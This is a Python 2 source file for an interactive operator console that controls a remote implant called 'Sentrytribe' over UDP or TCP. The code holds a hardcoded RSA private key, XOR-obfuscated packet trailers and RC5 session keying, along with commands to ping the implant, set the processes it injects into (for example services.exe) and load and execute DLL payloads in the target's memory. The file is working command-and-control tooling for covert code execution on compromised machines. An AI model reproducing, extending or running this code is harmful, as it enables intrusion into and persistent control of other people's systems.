from socket import *
import Crypto.PublicKey.RSA as RSA 
import binascii, struct, random, subprocess, time, os

def squash(arr):
	return long(''.join([binascii.hexlify(chr(c)) for c in arr]), 16)

private_modulus = squash([0xef, 0xed, 0x1c, 0xf7, 0xba, 0x1d, 0xf9, 0xcb, 0x33, 0x5c, 0x5a, 0xfb, 
	0x0a, 0x60, 0xcd, 0xeb, 0x00, 0x39, 0x9e, 0x8b, 0x8d, 0xa2, 0x12, 0xb8, 
	0xec, 0x02, 0xfe, 0x6c, 0x04, 0x6a, 0x09, 0x59, 0x0c, 0x6d, 0x9a, 0xeb, 
	0x8e, 0xdb, 0xdc, 0x3e, 0x89, 0xf4, 0x2a, 0xdc, 0xfb, 0xc0, 0x6b, 0x73, 
	0x47, 0x5e, 0xa5, 0xac, 0x72, 0xed, 0xd9, 0x26, 0x9c, 0x1d, 0xdc, 0x7a, 
	0xf5, 0x19, 0x2f, 0x14, 0xcc, 0x20, 0x42, 0x9a, 0xed, 0x46, 0xd3, 0x02, 
	0xeb, 0x25, 0x6f, 0x0c, 0x0c, 0xc0, 0x09, 0x5f, 0xc1, 0x06, 0x2b, 0x1c, 
	0x55, 0xc3, 0xe0, 0xed, 0x10, 0xdf, 0xcb, 0x53, 0x4f, 0x9b, 0xdb, 0xa2, 
	0xd4, 0x8c, 0x5a, 0xf6, 0x5b, 0xcb, 0x17, 0xf6, 0x22, 0x14, 0xeb, 0xe9, 
	0xae, 0x78, 0x1a, 0xd0, 0x41, 0x4d, 0xfc, 0x09, 0x93, 0xcd, 0xd4, 0x63, 
	0x3e, 0xb3, 0x36, 0x39, 0x2b, 0xad, 0x3e, 0xd5])

private_pub_exponent =	squash([0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01])

private_priv_exponent = squash([0xbf, 0xca, 0xd7, 0x1e, 0x3c, 0xdc, 0x9b, 0x83, 0x51, 0x62, 0x61, 0xa4, 
	0x4e, 0x6e, 0x86, 0x0d, 0x76, 0x97, 0x98, 0xe2, 0xcb, 0xec, 0xa4, 0x74, 
	0xc8, 0xcd, 0xb7, 0xde, 0x57, 0x45, 0x00, 0x85, 0xfb, 0xc6, 0x5e, 0x52, 
	0x31, 0x58, 0x15, 0xde, 0xb4, 0x5e, 0xc8, 0x28, 0xf0, 0xe2, 0xa7, 0xc2, 
	0x76, 0x69, 0xf5, 0x9c, 0x3e, 0x1f, 0x5e, 0x38, 0x5c, 0x12, 0x0e, 0xdf, 
	0x07, 0xb1, 0x03, 0x0d, 0x5b, 0xb8, 0x8b, 0x49, 0xc5, 0x99, 0xeb, 0x14, 
	0x99, 0x93, 0xcc, 0xe4, 0x1c, 0x92, 0x46, 0xd9, 0x19, 0x0b, 0xf1, 0x97, 
	0x38, 0xaa, 0x3b, 0xbf, 0xdb, 0xea, 0x01, 0xc7, 0xfe, 0x34, 0xff, 0xae, 
	0xcf, 0xbc, 0xaa, 0x20, 0xa4, 0xdd, 0x44, 0xc1, 0xef, 0x46, 0xde, 0xf1, 
	0xec, 0x5f, 0xca, 0xdd, 0xe6, 0xae, 0xfb, 0x80, 0x42, 0x8a, 0x99, 0xe7, 
	0xec, 0x34, 0x28, 0xe2, 0xbc, 0x29, 0xf3, 0x61])

def xor(data, key):
	"""
	Loop xor'ing key over data
	"""
	res = []
	for i in range(0, len(data)):
		res.append(chr(ord(data[i]) ^ ord(key[i%len(key)])))
	return ''.join(res)


def pad_for_rsa(data):
	"""
	Pad data out to the crypto block size (8 bytes)
	"""
	data = data + chr(0x00)*(16-len(data))
	return chr(0x01) + chr(0xff)*(127-len(data)-2) + chr(0x00) + data
	
	
def rsa_decrypt(data):
	"""
	Encrypt data with private key
	"""
	p = RSA.construct((private_modulus, private_pub_exponent, private_priv_exponent))
	return p.encrypt(data, 1)[0]


def rsa_encrypt(data):
	p = RSA.construct((private_modulus, private_pub_exponent, private_priv_exponent))
	return p.decrypt(data)

	
def pad_for_rc5(data):
	# pad for 8 bytes
	return  data + (8-len(data)%8)*chr(0x00)

	
def check_output(cmd):
	return subprocess.Popen(cmd, stdout=subprocess.PIPE).communicate()[0]
	
def rc5_decrypt(key, data):
	return binascii.unhexlify(check_output(['rc5.exe', 'd', binascii.hexlify(key), binascii.hexlify(data)]))
	
	
def rc5_encrypt(key, data):
	return binascii.unhexlify(check_output(['rc5.exe', 'e', binascii.hexlify(key), binascii.hexlify(data)]))
	
	
def trim_padding(data, len):
	"""
	trim the start of the buffer until the first null, return everything after that
	"""
	if len is None:
		# from RSA, find first null
		return data[data.find(chr(0x00))+1:]
	else:
		# from RC5, follow length
		return data[len:]
		
		
def bitmask(str):
	"""
	bitmask from character string
	"""
	res = []
	for ci in range(0, len(str)):
		c = str[ci]
		for i in range(0, 8):
			res.append(((ord(c) << i) & 0x80) >> 7)
	return res
	
	
def ridearea2(filename):
	#RideArea2 wrap filename, returning ridearea output name
	# ridearea2.exe -l m -i D:\PC_Level3_dll.configured -o D:\Logs\TEST\z0.0.0.1\LegacyExploits\st_ep_egg.ra2
	output = os.tempnam('.', 'ridearea_')
	print check_output(['ridearea2.exe', '-l', 'm', '-i', filename, '-o', output])
	return output


MAGIC = [chr(0xcb), chr(0x34)]
IP_HEADER_LENGTH = 20
UDP_HEADER_LENGTH = 8
TCP_HEADER_LENGTH = 20

CMD_REKEY_CRYPTO = 6
CMD_PING = 0
CMD_PING4 = 13
CMD_SET_INJECTION = 12
CMD_EXECUTE = 2


class Sentrytribe:
	def __init__(self, target_ip, target_port):
		self.target_ip = target_ip
		self.target_port = target_port
		self.protocol = 'udp'
		self.TIMEOUT = 5
		self.MAX_SEND_DATA = 407
		self.SEND_DELAY = 0.5
		self.session_key = None
		self.pending_messages = {}
		self.pending_msg_id = 0
		self.pending_fragments = {}

	def decode_cmd_header(self, data):
		res = list(struct.unpack('!BHHHH', data[:9]))
		res.append(data[9:9+res[4]])
		return res
		

	def build_packet_with_trailer(self, cmd_num, data, msg_id=None, packet_num=1, packet_count=1, header_len=UDP_HEADER_LENGTH):
		#Everything in network order
		
		#X - RSA byte
		#[command, RSA encrypted]
		#	6 // char, REKEY_CRYPTO
		#	1 // short, packet number
		#	1 // short, total packet count
		#	[random] // short, msgid
		#	4 // short, packetdatalen
		#	[callback_ip] // inet_aton of callback_ip
		#[trailer]
		#	// trailer.Start = htons(dataOffset) ^ 0xCB34
		#	// trailer.Length = htons(dataLength) ^ 1st ushort of data
		#	// trailer.Magic = htons(0xCB34) ^ 1st ushort of data
		#	// ensure start+length is within packet
		#	// ensure trailer.Magic = 0xCB34
		
		if msg_id is None:
			msg_id = random.randint(1,65535)
		
		cmd_header = struct.pack('!BHHHH', cmd_num, # REKEY_CRYPTO
												packet_num, # packet number
												packet_count, # total packet count
												msg_id, # msg id
												len(data)) # packetdatalen
		data = cmd_header + data
		
		# Negative offset after frame header... devices which add IP options will change this
		# TODO: add option to offset this for special networks
		data_offset = 0xFFFF - (IP_HEADER_LENGTH + header_len)

		# BUILD TRAILER
		if self.session_key is None and cmd_num != CMD_REKEY_CRYPTO:
			raise Exception("This command requires session key be set first")
		
		if self.session_key is None:
			# use RSA if no session key
			rsa_byte = 'X'
			data = rsa_encrypt(pad_for_rsa(data))
			data_length = len(data)
		else:
			rsa_byte = chr(0x0d)
			padded_data = pad_for_rc5(data)
			data_length = len(padded_data) # RC5 length seems to be padding length instead of whole packet
			data = rc5_encrypt(self.session_key, padded_data)
			
		trailer = xor(struct.pack('!H', data_offset), MAGIC)	# trailer.Start
		trailer += xor(struct.pack('!H', data_length), data[0:2]) # trailer.Length
		trailer += xor(chr(0xcb)+chr(0x34), data[0:2]) # trailer.Magic, 0xcb34 is big endian of length
		
		packet = data + rsa_byte + trailer
		
		return packet
		
		
	def send_data(self, cmd_num, data, msg_id=None, fragment_start=1, total_fragments=None):
		#Build command packet, fragment if needed, and send to target
		if (self.protocol == 'tcp'):
			s = socket(AF_INET, SOCK_STREAM)
			s.connect((self.target_ip, self.target_port))
			header_len = TCP_HEADER_LENGTH
		else:
			s = socket(AF_INET, SOCK_DGRAM)
			header_len = UDP_HEADER_LENGTH
		
		s.settimeout(self.TIMEOUT)
		
		total_fragments = total_fragments or (len(data) /self.MAX_SEND_DATA + 1)
		fragment = 1
		is_resend = msg_id
		msg_id = msg_id or random.randint(1,65535)
		
		if not is_resend:
			self.pending_messages[msg_id] = {}
			# save all fragments in advance in case of disconnect, TODO: this should be coupled more with next loop
			for i in xrange(0, len(data), self.MAX_SEND_DATA):
				fid = (fragment_start-1)+fragment
				print "[*][", msg_id,"] Saving fragment", fid, "/", total_fragments
				self.pending_messages[msg_id][fragment] = data[i:i+self.MAX_SEND_DATA]
				fragment += 1
		
		fragment = 1
		for i in xrange(0, len(data), self.MAX_SEND_DATA):
			fid = (fragment_start-1)+fragment
			print "[*][", msg_id,"] Sending fragment", fid, "/", total_fragments
				
			packet = self.build_packet_with_trailer(cmd_num, data[i:i+self.MAX_SEND_DATA], msg_id,  fid, total_fragments, header_len)
			
			if self.protocol == 'tcp':
				s.send(packet)
			else:
				s.sendto(packet, (self.target_ip, self.target_port))
			
			fragment += 1
			time.sleep(self.SEND_DELAY)
		
		return s

		
	def set_key(self, callback_ip):
		#Send a REKEY request and receive response

		# data portion of command is 4 byte IPv4 address
		#print 'REKEY_CRYPTO:'
		s = self.send_data(CMD_REKEY_CRYPTO, inet_aton(callback_ip))
		
		try:
			print "[*] Waiting for response from target..."
			self.session_key = self.decode_rekey_response(s.recv(4096))
			if self.session_key != None:
				print "[+] Session key:", binascii.hexlify(self.session_key)
			else:
				print "[-] Received response, but wasn't session key"
			s.close()
			return self.session_key
		except timeout:
			print "[-] Timeout waiting for rekey response"
			return None
			

	def ping_request(self, callback_ip):
		print "[*] About to send PING request:"
		s = self.send_data(CMD_PING, inet_aton(callback_ip))
		try:
			print "[*] Waiting for response from target..."
			resp = s.recv(4096)
			s.close()
			self.decode_rc5_response(resp)
		except timeout:
			print "[-] Timeout waiting for rekey response"
			return None
		

	def set_injection_procs(self, primary_proc, secondary_proc):
		#Send SET_STATRTUP_PROCS with two strings of IMAGENAME_LENGTH=16
		#(32 bytes total)
		if len(primary_proc) >= 16 or len(secondary_proc) >= 16:
			raise Exception("Injection process name must be less than 16 characters")
			
		data = struct.pack('16s16s', primary_proc, secondary_proc)
		self.send_data(CMD_SET_INJECTION, data).close()
		
		
	def load_and_execute(self, buffer):
		self.send_data(CMD_EXECUTE, buffer).close()
		
		
	def resend_message(self, msg_id):
		"""
		Resend fragments
		requires a ping done first to find missing fragments
		"""
		if self.pending_msg_id == msg_id and msg_id in self.pending_messages.keys():
			print "[+] Found saved message, only resending missing fragments"
			for i in self.pending_messages[msg_id].keys():
				if not self.pending_fragments[i-1]: # fragments starts at offset 0
					self.send_data(CMD_EXECUTE, self.pending_messages[msg_id][i], msg_id, i, len(self.pending_messages[msg_id].keys()))
				else:
					print "Skipping", i
		elif msg_id in self.pending_messages.keys():
			print "[+] Found saved message, but couldn't find ping or missing fragments, resending everything"
			frag_count =  len(self.pending_messages[msg_id].keys())
			for i in self.pending_messages[msg_id].keys():
				self.send_data(CMD_EXECUTE, self.pending_messages[msg_id][i], msg_id, i, frag_count)
		else:
			raise Exception("Couldn't find pending message, did you ping? "+repr(msg_id)+" not in "+str(self.pending_messages.keys()))

			
	def decode_trailer(self, data):
		trailer_start = xor(data[-6:-4], MAGIC)
		trailer_length = xor(data[-4:-2], data[0:2])
		trailer_magic = xor(data[-2:], data[0:2])

		if trailer_magic == ''.join(MAGIC):
			return {'start': trailer_start, 'length': int(binascii.hexlify(trailer_length), 16)}
		else:
			return None

		
	def decode_rekey_response(self, data):
		#// Trailer: ushort Start, Length, Magic
		#// ensure we have at least (IP header + TRAILER) bytes
		#// set trailer to be last TRAILER bytes of packet
		#// trailer.Start ^= 0XCB34 => ntohs
		#// ensure Start is within packet, after IP header, and isn't the last byte
		#// trailer.Length ^= 1st ushort of data => ntohs
		#// trailer.Magic ^= 1st ushort of data => ntohs
		trailer = self.decode_trailer(data)
		decrypted = trim_padding(rsa_encrypt(data[0:trailer['length']]), None)

		(cmd, packet_num, packet_count, msg_id, packetdatalen, data) = self.decode_cmd_header(decrypted)
		
		if cmd == CMD_REKEY_CRYPTO:
			return data # session key is data portion, -15 is start of packet data
		else:
			print "[-] Received response that wasn't REKEY: ", cmd
			return None



	def decode_rc5_response(self, data):
			trailer = self.decode_trailer(data)
			if not trailer:
				print "[-] Data is not a valid SENTRYTRIBE packet"
				return
				
			decrypted = rc5_decrypt(self.session_key, data[0:-6])		
			(cmd, packet_num, packet_count, msg_id, packetdatalen, data) = self.decode_cmd_header(decrypted)
			
			#print "cmd:", cmd, "pack_num:", packet_num, "count:", packet_count, "msg_id:", msg_id, "packetdatalen:", packetdatalen, "data:", binascii.hexlify(data)
			
			if cmd == CMD_PING4:
				# PING4 response:
				#typedef struct _PING4_HDR {
				#	unsigned char	Version;			//  0: version number (will be set to compiled value for ST_DRIVER_VERSION
				#	unsigned char	Name[15];			//  1: set to null-terminated name of implant
				#										//     "<unknown>" => implant unable to determine name
				#										//     "...+" => name too long to fit, but has specified prefix characters
				#	unsigned char	Process[13];		// 16: 8 dot 3 formatted name of a process that is being started on a reboot 
				#	unsigned long	ImplantID;          // 29
				#	unsigned long   LastCmdStatus;      // 33: status associated with last command
				#	unsigned char   LastCmd;            // 37: cmd code for last command
				#	unsigned char   PrimaryProcess[ST_IMAGENAME_LENGTH]; // 38: primary process to use for injection
				#	unsigned char   SecondaryProcess[ST_IMAGENAME_LENGTH]; // 54: secondary process to use for injection
				#	unsigned long   PendingMsgs;        // 70: Number of pending messages.
				#	unsigned char   Fragments[FRAGBIT_ARRAY_SIZE]; // 74: If there's at least one message pending, then this field
				#										//     will be a bit array in which set bits correspond to
				#										//     received fragments.
				#	// following this header will be the list of pending message numbers
				#	// (if too many, then there may be fewer than indicated in PendingMsgs)
				#} PING4_HDR, *PPING4_HDR;

				#LLB16s16sL24s
				ping4_header_len = 98
				(version, name, process, implant_id, last_cmd_status, last_cmd, primary_process, secondary_process, pending_msg_count, fragments) = struct.unpack('<B15s13s4sLB16s16sL24s', data[:ping4_header_len])
				bytes_remaining = len(data)-ping4_header_len
				print "\tVersion:", version
				print "\tName:", name
				print "\tStart on reboot:", process
				print "\tImplantID:", binascii.hexlify(implant_id)
				print "\tLastCmdStatus:", last_cmd_status
				print "\tLastCmd:", last_cmd
				if last_cmd == CMD_REKEY_CRYPTO:
					print "\t\t(set session key)"
				elif last_cmd == CMD_PING:
					print "\t\t(ping implant)"
				elif last_cmd == CMD_EXECUTE:
					print "\t\t(load and execute buffer)"
				print "\tPrimary process:", primary_process
				print "\tSecondary process:", secondary_process
				print "\tPending message count:", pending_msg_count
				print "\tBytes remaining:", bytes_remaining
				if bytes_remaining > 1:
					# Message ID is in little endian instead of network byte order
					print "Remaining data:", binascii.hexlify(data[ping4_header_len:])
					self.pending_msg_id = struct.unpack('<H', data[ping4_header_len:ping4_header_len+2])[0]
					print "\t* Pending msg id:", self.pending_msg_id
					self.pending_fragments = bitmask(fragments)
					for i in range(0, len(self.pending_fragments)):
						print "\t", i, ":", self.pending_fragments[i]
				
	
	


if __name__ == '__main__':
	st = Sentrytribe('192.168.254.71', 5300)
	st.protocol = 'udp'
	
	callback_ip = '192.168.0.1'
	
	while True:
		try:
			# no readline available...
			cmd = raw_input('COMMAND-> ').split(' ')
			cmd[0] = cmd[0].lower()
			
			if cmd[0] == 'set':
				if len(cmd) != 3:
					print "<option>\t<value>"
					print "target_ip\t",st.target_ip
					print "target_port\t",st.target_port
					print "protocol\t",st.protocol
					print "callback_ip\t",callback_ip
					print "send_delay\t",st.SEND_DELAY
					print "timeout\t\t",st.TIMEOUT
					print "Usage: set <option> <value>"
				else:
					if cmd[1] == 'target_ip':
						st.target_ip = cmd[2]
					elif cmd[1] == 'target_port':
						st.target_port = int(cmd[2])
					elif cmd[1] == 'protocol':
						st.protocol = cmd[2]
					elif cmd[1] == 'callback_ip':
						callback_ip = cmd[2]
					elif cmd[1] == 'send_delay':
						st.SEND_DELAY = float(cmd[2])
					elif cmd[1] == 'timeout':
						st.TIMEOUT = int(cmd[2])
					else:
						print "[-] Unknown option:", cmd[1]
					
			elif cmd[0] == 's':
				st.set_key(callback_ip)
			
			elif cmd[0] == 'p':
				st.ping_request(callback_ip)
			
			elif cmd[0] == 'j':
				st.set_injection_procs(cmd[1], cmd[1])
			
			elif cmd[0] == 'l':
				if len(cmd) != 2 or (not cmd[1].endswith(".dll") and not cmd[1].endswith("_dll.configured")):
					print "Payload must be a DLL"
					print "\tl peddlecheap.dll"
					continue
				with open(ridearea2(cmd[1]), 'rb') as f:
					f.seek(0, os.SEEK_END)
					length = f.tell()
					f.seek(0)
					buffer = f.read(length)
					print "Read", length, "bytes"
					st.load_and_execute(buffer)
					# auto send ping
					st.ping_request(callback_ip)
					
			elif cmd[0] == 'r':
				# resend!
				if len(cmd) == 1:
					print "[*] No message id set, using pending message from ping:", st.pending_msg_id
					st.resend_message(st.pending_msg_id)
				else:
					st.resend_message(int(cmd[1]))
				
			elif cmd[0] == 'q':
				print "Quitting..."
				break
			else:
				print """===============================================================================
	set: Set options (set <option> <value>), type "set" to see options
	s: Set session key
	p: Ping implant
	j: Change injection (ex: j services.exe)
	l: Load a DLL into memory (ex: l peddlecheap.dll)
	r: resend message (ex: r 34122), if no message id is set it will resend
	   the last pending message from ping
	q: Quit

	Target: %s:%d
	Callback: %s
	Session key: %s
===============================================================================
			""" % (st.target_ip, st.target_port, callback_ip, binascii.hexlify(st.session_key or ''))

		except Exception, e:
			print "[-] Error:", str(e)

